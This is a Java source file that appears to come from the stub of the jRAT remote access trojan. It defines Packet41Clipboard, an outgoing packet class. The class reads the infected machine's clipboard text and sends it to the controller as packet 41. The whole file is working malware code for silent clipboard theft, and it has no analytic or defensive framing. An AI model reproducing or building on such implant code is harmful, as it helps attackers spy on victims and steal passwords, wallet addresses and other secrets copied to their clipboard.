package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;

import java.awt.Toolkit;
import java.awt.datatransfer.DataFlavor;
import java.io.DataOutputStream;


public class Packet41Clipboard extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine((String) Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor));
	}

	@Override
	public short getPacketId() {
		return 41;
	}

}
